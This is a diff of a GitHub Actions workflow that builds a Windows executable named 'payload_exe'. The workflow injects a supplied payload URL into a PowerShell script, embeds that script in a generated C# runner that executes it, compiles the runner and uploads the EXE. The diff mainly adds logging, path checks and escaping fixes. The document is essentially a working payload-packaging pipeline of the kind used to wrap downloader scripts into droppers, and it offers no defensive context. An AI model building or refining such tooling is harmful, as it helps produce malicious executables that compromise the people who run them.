@@ -20,11 +20,22 @@ jobs:
       run: dotnet --version
 
     - name: Inject URL into static_code.ps1
+      shell: powershell
       run: |
+        $scriptPath = "$env:GITHUB_WORKSPACE\static_code.ps1"
+        if (-Not (Test-Path $scriptPath)) {
+            Write-Host "[ERROR] static_code.ps1 not found!"
+            exit 1
+        }
+        
         $url = '${{ github.event.inputs.payload_url }}'
-        (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
+        Write-Host "[INFO] Injecting URL into static_code.ps1: $url"
+        
+        (Get-Content -Path $scriptPath) -replace '__PAYLOAD_URL__', $url | Set-Content -Path $scriptPath
+        Write-Host "[SUCCESS] URL injected into static_code.ps1"
 
     - name: Create .NET console project
+      shell: powershell
       run: |
         dotnet new console -o PowerShellRunner
         cd PowerShellRunner
@@ -33,27 +44,54 @@ jobs:
     - name: Generate C# code with Embedded PowerShell Script
       shell: powershell
       run: |
-        $ps_script = Get-Content -Path 'static_code.ps1' -Raw
-        $escaped_script = $ps_script -replace """, """" -replace "r?n", "n"
+        $scriptPath = "$env:GITHUB_WORKSPACE\static_code.ps1"
 
-        $csharp_code = @"
+        if (-Not (Test-Path $scriptPath)) {
+            Write-Host "[ERROR] static_code.ps1 not found before embedding!"
+            exit 1
+        }
+
+        Write-Host "[INFO] Reading PowerShell script..."
+        $psScript = Get-Content -Path $scriptPath -Raw
+
+        Write-Host "[INFO] Escaping PowerShell script for C#..."
+        $escapedScript = $psScript -replace "\\", "\\\\" `
+                                   -replace "`"", "\\`"" `
+                                   -replace "`r?`n", "\n"
+
+        $csharpCode = @"
         using System;
         using System.Management.Automation;
 
         class Program {
             static void Main() {
-                string script = @"$escaped_script";
+                Console.WriteLine("[INFO] PowerShell execution started from C#.");
+                string script = @`"$escapedScript`";
+                
                 using (PowerShell ps = PowerShell.Create()) {
                     ps.AddScript(script);
-                    ps.Invoke();
+                    var results = ps.Invoke();
+                    Console.WriteLine("[INFO] Execution Results:");
+                    foreach (var result in results) {
+                        Console.WriteLine(result);
+                    }
+                    if (ps.HadErrors) {
+                        Console.WriteLine("[ERROR] PowerShell encountered an error.");
+                        foreach (var error in ps.Streams.Error) {
+                            Console.WriteLine(error.ToString());
+                        }
+                    }
                 }
+                Console.WriteLine("[SUCCESS] PowerShell execution completed.");
             }
         }
         "@
 
-        Set-Content -Path 'PowerShellRunner/Program.cs' -Value $csharp_code
+        Set-Content -Path "$env:GITHUB_WORKSPACE\PowerShellRunner\Program.cs" -Value $csharpCode
+        Write-Host "[SUCCESS] C# code written to PowerShellRunner/Program.cs"
 
     - name: Build EXE
+      shell: powershell
       run: |
         cd PowerShellRunner
         dotnet build -c Release
@@ -62,4 +100,5 @@ jobs:
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
-        path: PowerShellRunner/bin/Release/net9.0/PowerShellRunner.exe
+        path: PowerShellRunner/bin/Release/**/PowerShellRunner.exe
+
